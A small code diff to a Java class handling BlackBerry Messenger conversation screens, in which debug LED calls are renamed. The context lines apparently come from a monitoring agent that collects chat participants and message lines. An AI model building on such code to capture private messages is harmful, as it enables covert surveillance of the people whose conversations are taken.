@@ -43,7 +43,7 @@ public class ConversationScreen {
         try {
             if (bbmApplication == null || !Backlight.isEnabled()) {
                 //#ifdef DEBUG
-                debug.ledStart(Debug.COLOR_RED);
+                debug.led(Debug.COLOR_RED);
                 //#endif
                 return;
             }
@@ -92,7 +92,7 @@ public class ConversationScreen {
                     agent.add(partecipants, lines);
 
                     //#ifdef DEBUG
-                    debug.ledStart(Debug.COLOR_YELLOW);
+                    debug.led(Debug.COLOR_YELLOW);
                     //#endif
                 }
             }
